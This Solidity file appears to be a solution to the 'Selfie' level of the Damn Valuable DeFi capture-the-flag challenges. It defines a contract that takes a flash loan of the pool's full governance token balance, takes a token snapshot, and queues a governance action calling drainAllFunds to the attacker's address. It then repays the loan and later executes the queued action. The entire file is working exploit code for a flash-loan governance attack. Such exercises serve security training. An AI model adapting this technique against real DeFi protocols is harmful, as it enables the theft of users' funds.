// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract SelfieAttacker{

    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public governanceToken;
    uint256 proposalId;
    address attacker;

    constructor(address _selfiePool, address _simpleGovernance, address token, address _attacker){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        governanceToken = DamnValuableTokenSnapshot(token);
        attacker = _attacker;
    }

    function attack() external{
        uint256 amount = governanceToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address token,uint256 amount) external{
        DamnValuableTokenSnapshot tokensnap = DamnValuableTokenSnapshot(token);
        tokensnap.snapshot();
        
        proposalId = simpleGovernance.queueAction(address(selfiePool), 
        abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);

        governanceToken.transfer(address(selfiePool), amount);
    }

    function executeAction() external{
        simpleGovernance.executeAction(proposalId);
    }
}